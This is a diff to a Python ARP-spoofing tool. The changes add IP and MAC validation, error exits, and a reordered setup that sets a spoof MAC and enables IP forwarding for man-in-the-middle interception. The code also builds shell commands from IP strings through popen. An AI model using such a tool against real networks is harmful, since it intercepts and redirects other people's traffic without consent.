@@ -18,15 +18,30 @@ from netifaces import gateways, AF_INET, AF_LINK, ifaddresses
 from scapy.all import *
 from time import sleep
 from os import popen
+from re import match
 from argparse import ArgumentParser
+
+def fvalidip(ip):
+	if match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$",ip):
+		return ip
+	else:
+		return False
+
+def fvalidmac(mac):
+	if match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", mac.lower()):
+		return mac
+	else:
+		return False
 
 def fgetmac(ip):
 	popen('ping %s -c 1' % ip).read()
-	return popen("arp -a | grep '(%s)' | cut -d 't' -f 2 | cut -d ' ' -f 2" %(ip)).read().strip()
+	mac = popen("arp -a | grep '(%s)' | cut -d 't' -f 2 | cut -d ' ' -f 2" %(ip)).read().strip()
+	return fvalidmac(mac)
 
 def fownmac():
 	def_gw_device = gateways()['default'][AF_INET][1]
-	return ifaddresses(def_gw_device)[AF_LINK][0]['addr']
+	mac = ifaddresses(def_gw_device)[AF_LINK][0]['addr']
+	return fvalidmac(mac)
 
 def ffix():
 	for target in targetlist:
@@ -49,15 +64,12 @@ parser.add_argument('-f', "--nofix", action="store_true", help="Don't fix ARP ta
 args = parser.parse_args()
 ismitm = ''
 
-if args.mac:
-	spoofmac = args.mac
-else:
-	spoofmac = fownmac()
-	popen("echo 1 > /proc/sys/net/ipv4/ip_forward").read()
-	ismitm = ' (MiTM)'
-
 routerip = gateways()['default'].values()[0][0]
-network = '.'.join(routerip.split('.')[:3])
+if fvalidip(routerip):
+	network = '.'.join(routerip.split('.')[:3])
+else:
+	print " [X] Error detecting the router IP, got: %s" % routerip
+	exit()
 
 try:
 	targets = args.targets.split(',')
@@ -66,13 +78,32 @@ except:
 	exit()
 
 routermac = fgetmac(routerip)
-print " [*] Detected router: %s (%s)" % (routerip, routermac)
+if routermac:
+	print " [*] Detected router: %s (%s)" % (routerip, routermac)
+else:
+	print " [X] Error detecting the router MAC, got: %s" % routermac
+	exit()
+	
+ownmac = fownmac()
+if not ownmac:
+	print " [X] Error detecting our own MAC, got: %s" % ownmac
+	exit()
+
+if args.mac:
+	spoofmac = args.mac
+	if not fvalidmac(spoofmac):
+		print " [X] Your user defined spoof MAC is not valid, got: %s" % spoofmac
+		exit()
+else:
+	spoofmac = ownmac
+	popen("echo 1 > /proc/sys/net/ipv4/ip_forward").read()
+	ismitm = ' (MiTM)'
 
 targetlist = []
 for target in targets:
-	targetip = network + '.' + target
+	targetip = '%s.%s' % (network, target)
 	targetmac = fgetmac(targetip)
-	if len(targetmac) == 17:
+	if targetmac:
 		print " [*] Detected target: %s (%s)" % (targetip, targetmac)
 		targetlist.append([targetip, targetmac])
 	else:
